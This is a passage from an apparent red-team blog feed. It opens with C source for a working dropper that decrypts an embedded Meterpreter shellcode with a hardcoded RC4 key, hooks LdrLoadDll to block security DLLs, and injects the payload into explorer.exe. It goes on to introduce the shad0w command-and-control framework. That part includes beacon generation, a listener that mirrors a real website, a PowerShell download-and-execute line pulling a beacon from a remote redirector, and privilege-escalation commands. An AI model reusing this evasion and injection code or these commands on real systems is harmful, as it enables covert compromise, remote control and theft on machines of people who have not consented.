  0x77, 0x61, 0x54, 0x56, 0x8f, 0x43, 0xd7, 0x5b, 0xc3, 0x29, 0x1e, 0x16,
  0xda, 0xf3, 0x58, 0x83, 0x8c, 0xd7, 0xf2, 0x3d, 0x4c, 0xb4, 0x3d, 0xcb,
  0x24, 0xfa, 0x84, 0x00, 0x58, 0x28, 0x96, 0xe0, 0x1b, 0x57, 0x03, 0x2e,
  0xc6, 0xc5, 0x22, 0x31, 0xc1, 0x1d, 0xe4, 0xd5, 0x8a, 0x4c, 0x79, 0x5f,
  0x83, 0x05, 0xe3, 0x73, 0x8c, 0x11, 0x9e, 0x57, 0xcf, 0x5f, 0xa9, 0x7b,
  0x26, 0xfa, 0xc3, 0xad, 0xd1, 0x2c, 0x57, 0x32, 0xbe, 0x3a, 0x41, 0x18,
  0x55, 0x87, 0x74, 0xc0, 0xbf, 0x26, 0xd8, 0x01, 0xf0, 0x15, 0xdd, 0x2b,
  0xe6, 0x35, 0x7a, 0xcc, 0x18, 0x83, 0xf4, 0xdd, 0xc9, 0x75, 0x68, 0x12,
  0x6d, 0x19, 0x10, 0x2b, 0xb6, 0x89, 0x20, 0x35, 0xd4, 0x81, 0x36, 0xe2,
  0x4d, 0xf0, 0xfb, 0x1d, 0x0f, 0xfa, 0xb6, 0x9e, 0x74, 0x2d, 0x51, 0x33,
  0x79, 0xa8, 0xc1, 0xda, 0x55, 0x14, 0x87, 0x44, 0xc2, 0x19, 0x28, 0x28,
  0x8a, 0xe9, 0x24, 0x01, 0x99, 0xae, 0xa4, 0xa1, 0xdf, 0xb1, 0xcf, 0x87,
  0x54, 0x93, 0x51, 0xcc, 0xb7, 0x02, 0x4c, 0x2e, 0xeb, 0xdc, 0x7c, 0x72,
  0xbe, 0x4b, 0x2c, 0xaa, 0x34, 0x44, 0x6f, 0xbb, 0xc5, 0x79, 0x20, 0xb9,
  0x67, 0x52, 0x1e, 0x28, 0x71, 0x40, 0x72, 0xa6, 0x5b, 0x4f, 0xa0, 0xc2,
  0x1e, 0x2e, 0x6f, 0x48, 0x16, 0x1a, 0x3a, 0xfd, 0xb5, 0x9b, 0x84, 0x3c,
  0x9c, 0x4c, 0x61, 0x63, 0xe0, 0x34, 0x57, 0x24, 0xab, 0x6c, 0x3e, 0xb3,
  0x8a, 0x02, 0x74, 0x59, 0x27, 0x20, 0x0f, 0xd5, 0x8e, 0x1e, 0x5c, 0x43,
  0x61, 0xf0, 0x4d, 0x5b, 0xb3, 0x00, 0xea, 0x18, 0xb2, 0xef, 0x43, 0x94,
  0xd8, 0x5d, 0x5d, 0x4b, 0xc6, 0xd9, 0xed, 0x2f, 0xca, 0xed, 0xe1, 0x79,
  0x0c, 0xa1, 0x46, 0x77, 0x78, 0x15, 0x87, 0x9d, 0xea, 0x9e, 0xa6, 0x8b,
  0x10, 0x29, 0x49, 0x28, 0xca, 0xc1, 0x07, 0x19, 0x9b, 0x54, 0xb2, 0x1b,
  0xd2, 0x9b, 0xbc, 0x7d, 0x9c, 0x14, 0x97, 0x43, 0x7b, 0x33, 0x41, 0xd3,
  0x26, 0x7f, 0xe9, 0xf1, 0xbf, 0xfb, 0xd8, 0xc5, 0x96, 0x19, 0x5e, 0x65,
  0xa3, 0xb1, 0x18, 0x44, 0x16, 0xc1, 0x63, 0x72, 0xc8, 0x53, 0xa5, 0x74,
  0xee, 0x2c, 0x7c, 0xe2, 0x0f, 0xe4, 0x11, 0x91, 0x4d, 0xe3, 0xa4, 0xa6,
  0xd9, 0xf0, 0x59, 0x97, 0xbb, 0x86, 0x1e, 0xc4, 0x68, 0x64, 0x4b, 0x45,
  0x00, 0xf0, 0x78, 0xac, 0x98, 0x21, 0xfe, 0xd3, 0xdd, 0xe8, 0xa3, 0xca,
  0x0d, 0x77, 0xb8, 0xab, 0x7c, 0xe2, 0x64, 0x26, 0x37, 0x76, 0x85, 0x92,
  0x91, 0x2e, 0x62, 0x25, 0x6b, 0x3e, 0xd5, 0xf2, 0xf0, 0x9a, 0xda, 0xc3,
  0x60, 0x90, 0xca, 0x00, 0x04, 0x19
};
unsigned int encmeter_bin_len = 510;
/****************************************************************************************************/

NTSTATUS __stdcall _LdrLoadDll(PWSTR SearchPath OPTIONAL, PULONG DllCharacteristics OPTIONAL, PUNICODE_STRING DllName, PVOID *BaseAddress)
{
    INT i;
    DWORD dwOldProtect;
    BOOL bAllow = FALSE;
    DWORD dwbytesWritten;
    CHAR cDllName[MAX_PATH];

    // change to a char
    sprintf(cDllName, &amp;#34;%S&amp;#34;, DllName-&amp;gt;Buffer);

    for (i = 0; I &amp;lt; dwAllowDllCount; i&amp;#43;&amp;#43;)
    {
        // is it on the whitelist
        if (strcmp(cDllName, cAllowDlls[i]) == 0)
        {
            bAllow = TRUE;

            printf(&amp;#34;Allowing DLL: %s\\n&amp;#34;, cDllName);

            // repatch LdrLoadDll and call it
            VirtualProtect(lpAddr, sizeof(OriginalBytes), PAGE_EXECUTE_READWRITE, &amp;amp;dwOldProtect);
            memcpy(lpAddr, OriginalBytes, sizeof(OriginalBytes));
            VirtualProtect(lpAddr, sizeof(OriginalBytes), dwOldProtect, &amp;amp;dwOldProtect);

            LdrLoadDll_ LdrLoadDll = (LdrLoadDll_)GetProcAddress(LoadLibrary(&amp;#34;ntdll.dll&amp;#34;), &amp;#34;LdrLoadDll&amp;#34;);

            LdrLoadDll(SearchPath, DllCharacteristics, DllName, BaseAddress);

            // then hook it again
            HookLoadDll(lpAddr);
        }

    }

    if (!bAllow)
    {
        printf(&amp;#34;Blocked DLL: %s\\n&amp;#34;, cDllName);
    }

    return TRUE;
}

VOID HookLoadDll(LPVOID lpAddr)
{
    DWORD oldProtect, oldOldProtect;
    void *hLdrLoadDll = &amp;amp;_LdrLoadDll;

    // our trampoline
    unsigned char boing[] = { 0x49, 0xbb, 0xde, 0xad, 0xc0, 0xde, 0xde, 0xad, 0xc0, 0xde, 0x41, 0xff, 0xe3 };

    // add in the address of our hook
    *(void **)(boing &amp;#43; 2) = &amp;amp;_LdrLoadDll;

    // write the hook
    VirtualProtect(lpAddr, 13, PAGE_EXECUTE_READWRITE, &amp;amp;oldProtect);
    memcpy(lpAddr, boing, sizeof(boing));
    VirtualProtect(lpAddr, 13, oldProtect, &amp;amp;oldProtect);

    return;
}

BOOL DecryptShellcode()
{
    BOOL bSuccess = TRUE;

    HCRYPTKEY hCryptoKey;
    HCRYPTHASH hCryptHash;
    HCRYPTPROV hCryptoProv;

    BYTE* pbKey = &amp;#34;HideMyShellzPlz?&amp;#34;;
    DWORD dwLen = strlen(pbKey);

    // get the crypto context
    bSuccess = fnCryptAcquireContextW(&amp;amp;hCryptoProv, NULL, L&amp;#34;Microsoft Enhanced RSA and AES Cryptographic Provider&amp;#34;, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    if (!bSuccess)
    {
        printf(&amp;#34;CryptAcquireContextW\\n&amp;#34;);
        goto CLEANUP;
    }

    // init an create the hashing handle
    bSuccess = fnCryptCreateHash(hCryptoProv, CALG_SHA_256, 0, 0, &amp;amp;hCryptHash);
    if (!bSuccess)
    {
        printf(&amp;#34;CryptCreateHash\\n&amp;#34;);
        goto CLEANUP;
    }

    // add the key to the hash object
    bSuccess = fnCryptHashData(hCryptHash, pbKey, dwLen, 0);
    if (!bSuccess)
    {
        printf(&amp;#34;CryptHashData\\n&amp;#34;);
        goto CLEANUP;
    }

    // gen the session keys from the hash
    bSuccess = fnCryptDeriveKey(hCryptoProv, CALG_RC4, hCryptHash, 0,&amp;amp;hCryptoKey);
    if (!bSuccess)
    {
        printf(&amp;#34;CryptDeriveKey\\n&amp;#34;);
        goto CLEANUP;
    }

    // decrypt the buffer
    bSuccess = fnCryptDecrypt(hCryptoKey, NULL, FALSE, 0, (BYTE*)encmeter_bin, &amp;amp;encmeter_bin_len);
    if (!bSuccess)
    {
        printf(&amp;#34;CryptDecrypt: %d\\n&amp;#34;, GetLastError());
        goto CLEANUP;
    }

    goto CLEANUP;

    CLEANUP:
        fnCryptReleaseContext(hCryptoProv, 0);
        fnCryptDestroyKey(hCryptoKey);
        fnCryptDestroyHash(hCryptHash);

        return bSuccess;
}

DWORD FindExplorer()
{
    PROCESSENTRY32 pe32 = {0};
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // take snapshot
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnapshot)
    {
        // enum the processes found
        if(Process32First(hSnapshot, &amp;amp;pe32))
        {
            do
            {
                // check if its explorer, if it is then give the pid
                if (strcmp(pe32.szExeFile, &amp;#34;explorer.exe&amp;#34;) == 0)
                {
                    return pe32.th32ProcessID;
                }
            } while(Process32Next(hSnapshot, &amp;amp;pe32));
            CloseHandle(hSnapshot);
        }
    }

    return -1;
}

int main(int argc,  char const *argv[])
{
    DWORD dwPid;
    INITIAL_TEB InitTeb;
    LPVOID lpBuffer = NULL;
    CLIENT_ID uPid = { 0 };
    HANDLE hThread, hProcess;
    OBJECT_ATTRIBUTES ObjectAttributes;

    // crypto stuff
    fnCryptAcquireContextW = (CryptAcquireContextW_)GetProcAddress(LoadLibrary(&amp;#34;advapi32.dll&amp;#34;), &amp;#34;CryptAcquireContextW&amp;#34;);
    fnCryptCreateHash = (CryptCreateHash_)GetProcAddress(LoadLibrary(&amp;#34;advapi32.dll&amp;#34;), &amp;#34;CryptCreateHash&amp;#34;);
    fnCryptHashData = (CryptHashData_)GetProcAddress(LoadLibrary(&amp;#34;advapi32.dll&amp;#34;), &amp;#34;CryptHashData&amp;#34;);
    fnCryptDeriveKey = (CryptDeriveKey_)GetProcAddress(LoadLibrary(&amp;#34;advapi32.dll&amp;#34;), &amp;#34;CryptDeriveKey&amp;#34;);
    fnCryptDecrypt = (CryptDecrypt_)GetProcAddress(LoadLibrary(&amp;#34;advapi32.dll&amp;#34;), &amp;#34;CryptDecrypt&amp;#34;);
    fnCryptReleaseContext = (CryptReleaseContext_)GetProcAddress(LoadLibrary(&amp;#34;advapi32.dll&amp;#34;), &amp;#34;CryptReleaseContext&amp;#34;);
    fnCryptDestroyKey = (CryptDestroyKey_)GetProcAddress(LoadLibrary(&amp;#34;advapi32.dll&amp;#34;), &amp;#34;CryptDestroyKey&amp;#34;);
    fnCryptDestroyHash = (CryptDestroyHash_)GetProcAddress(LoadLibrary(&amp;#34;advapi32.dll&amp;#34;), &amp;#34;CryptDestroyHash&amp;#34;);

    // decrypt the shellcode
    if (!DecryptShellcode())
    {
        printf(&amp;#34;[!] Failed to decrypt shellcode\\n&amp;#34;);
        return -1;
    }

    // get addresss of where the hook should be
    lpAddr = (LPVOID)GetProcAddress(GetModuleHandle(&amp;#34;ntdll.dll&amp;#34;), &amp;#34;LdrLoadDll&amp;#34;);

    // save the original bytes
    memcpy(OriginalBytes, lpAddr, 13);

    // set the hook
    HookLoadDll(lpAddr);

    // find the pid of explorer.exe
    dwPid = FindExplorer();
    if (dwPid == -1)
    {
        printf(&amp;#34;[!] Failed to find process\\n&amp;#34;);
        return -1;
    }

    // set the pid to get a handle to
    uPid.UniqueProcess = (HANDLE)dwPid;
    uPid.UniqueThread = NULL;

    // get a handle on the process
    InitializeObjectAttributes(&amp;amp;ObjectAttributes, NULL, 0, NULL, NULL);
    NtOpenProcess(&amp;amp;hProcess, PROCESS_ALL_ACCESS, &amp;amp;ObjectAttributes, &amp;amp;uPid);

    // alloc memory
    NtAllocateVirtualMemory(hProcess, &amp;amp;lpBuffer, 0, &amp;amp;encmeter_bin_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // write the shellcode to the process
    NtWriteVirtualMemory(hProcess, lpBuffer, encmeter_bin, encmeter_bin_len, NULL);

    // start the shellcode
    NtCreateThreadEx(&amp;amp;hThread, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, FALSE, NULL, NULL, NULL, NULL);
    if (hThread == INVALID_HANDLE_VALUE)
    {
        printf(&amp;#34;[!] Failed to inject shellcode\\n&amp;#34;);
        return -1;
    }

    printf(&amp;#34;[&amp;#43;] Successfully injected shellcode\\n&amp;#34;);

    return 0;
}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;And when we execute our new dropper&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/exec_injector.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;We can catch a meterpreter session&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/msf_ss-1024x355.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Or if we used a &lt;code&gt;windows/x64/meterpreter/reverse_https&lt;/code&gt; payload with a set &lt;code&gt;StagerURILength&lt;/code&gt; we can catch a shad0w beacon as well.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/shad0w_ss-1024x403.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Hopefully some of these techniques could be of use to you. If you are interested and want to research further, my C2 Framework &lt;a href=&#34;https://github.com/bats3c/shad0w&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;shad0w&lt;/a&gt; implements many of these techniques and more. Any questions feel free to DM me on twitter &lt;a href=&#34;https://twitter.com/_batsec_&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@_batsec_&lt;/a&gt;&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>shad0w</title>
      <link>//localhost:1313/articles/2020/06/2020-06-03-shad0w/</link>
      <pubDate>Wed, 03 Jun 2020 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2020/06/2020-06-03-shad0w/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://github.com/bats3c/shad0w&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;This project can be found on github&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Post exploitation is large part of a red team engagement. While many organisations begin to mature and start to deploy a range of sophisticated Endpoint Detection &amp;amp; Response solutions (EDR) onto their networks, it requires us, as attackers to also mature. We need to upgrade our arsenal to give us the capabilities to successfully operate on their networks. That is why today, I am releasing shad0w.&lt;/p&gt;
&lt;p&gt;shad0w is a post exploitation framework which is designed to operate covertly on such networks, providing the operator with much greater control over their engagements. Over future blog posts I will go into greater detail on the intricacies of how shad0w works. This blog post will, therefore, serve as an introduction into the usage and features that shad0w has to offer.&lt;/p&gt;
&lt;h2&gt;Overview &amp;amp; Install&lt;span class=&#34;absolute -mt-20&#34; id=&#34;overview--install&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#overview--install&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;shad0w is designed to be run inside docker, this is to make life easier for the operator as it has some very specific dependencies which are required for it to work correctly. Installation is very simple, just requiring the two commands shown below.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;$ git clone https://github.com/bats3c/shad0w.git &amp;amp;&amp;amp; cd shad0w
$ sudo ./shad0w install&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h2&gt;Getting a foothold&lt;span class=&#34;absolute -mt-20&#34; id=&#34;getting-a-foothold&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#getting-a-foothold&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;shad0w implants are called beacons. There are two types of beacons: secure and insecure. Secure beacons are designed to operate in environments where it is vital to remain undetected whereas insecure beacons are for environments where the security is much more relaxed.&lt;/p&gt;
&lt;p&gt;Currently there are 3 different formats for beacons: exe, shellcode and powershell. The shellcode and powershell formats allow for shad0w to be used in completely fileless attacks allowing everything to be run entirely inside memory.&lt;/p&gt;
&lt;p&gt;To generate such a payload you can use the command shown below, this will place the payload of a statically linked secure beacon in &lt;code&gt;beacon.ps1&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;$ shad0w beacon -p x64/windows/secure/static -H your.redirector -f psh -o beacon.ps1&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;The next steps would be to start the C2 server. When starting the C2 it will need to be given the address that the beacon will connect to. So if you are using redirectors it would not be the address of the C2 but rather the address of your first redirector. The command for starting a C2 instance for the beacons to callback to is shown below&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;$ shad0w listen -e your.redirector&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;A feature which could also be useful is the C2 servers ability to live proxy and essentially clone a website. This feature can be used with the &lt;code&gt;--mirror&lt;/code&gt; or &lt;code&gt;-m&lt;/code&gt; flag. This example would mirror the site &lt;a href=&#34;https://www.bbc.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.bbc.com/&lt;/a&gt; to the address of your redirector &lt;a href=&#34;https://your.redirector/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://your.redirector/&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;$ shad0w listen -e your.redirector -m &amp;#34;https://www.bbc.com/&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;So then when you visit your redirector you are given &lt;a href=&#34;https://www.bbc.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.bbc.com/&lt;/a&gt;. This will also proxy any links you click or files you download which are on the site you have mirrored.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/mirror2.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/mirror3-1024x557.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Now that your C2 is up and running you can execute the beacon. I will use an example of how you can do so with powershell but due to the beacon being in shellcode form, you can quite easily execute the beacon from many other languages.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;PS&amp;gt; IEX (New-Object System.Net.WebClient).DownloadString(&amp;#34;https://another.redirector/beacon.ps1&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;And we get a callback&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/catch_session_resize.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Enumeration&lt;span class=&#34;absolute -mt-20&#34; id=&#34;enumeration&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#enumeration&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Now that we have a active session on the machine we can interact with it via the &lt;code&gt;beacons&lt;/code&gt; command.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;shad0w ≫ beacons -i 1&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;shad0w has some useful commands that can be used to explore and interact with the local file system e.g &lt;code&gt;ls cd pwd rm cat mkdir&lt;/code&gt; while also letting you &lt;code&gt;upload&lt;/code&gt; and &lt;code&gt;download&lt;/code&gt; files.&lt;/p&gt;
&lt;p&gt;One of the most useful features of shad0w is that it allows you to execute any .NET assembly, EXE, DLL, VBS, JS or XSL file in memory on the target without anything touching disk. For example to execute the .NET assembly &lt;code&gt;seatbelt.exe&lt;/code&gt; in memory you can use the &lt;code&gt;execute&lt;/code&gt; command, giving the file name with the &lt;code&gt;-f&lt;/code&gt; flag and any arguments with the &lt;code&gt;-p&lt;/code&gt; flag&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;shad0w ≫ execute -f seatbelt.exe -p all&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;All the output from the command will be sent back to your terminal window&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/execute_resize.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Privilege Escalation&lt;span class=&#34;absolute -mt-20&#34; id=&#34;privilege-escalation&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#privilege-escalation&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;I have designed shad0w to be very modular, allowing operators to create and use their own modules. I have kept this philosophy in mind when making the &lt;code&gt;elevate&lt;/code&gt; command. I designed it to help elevate the current beacons privileges by using common privilege escalation techniques &amp;amp; exploits all of which are stored in easy to use modules, allowing an operator to create new or build on existing modules easily.&lt;/p&gt;
&lt;p&gt;To list the available privesc modules for the current session you can use the &lt;code&gt;--list&lt;/code&gt; or &lt;code&gt;-l&lt;/code&gt; flag&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;shad0w ≫ elevate --list&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Modules come in two different modes, check and exploit. To run a modules in check mode use the &lt;code&gt;--check&lt;/code&gt; or &lt;code&gt;-c&lt;/code&gt; flags and to use a module in exploit mode use the &lt;code&gt;--use&lt;/code&gt; or &lt;code&gt;-u&lt;/code&gt; flags.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;shad0w ≫ elevate --check system_printspoofer
shad0w ≫ elevate --use system_printspoofer&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
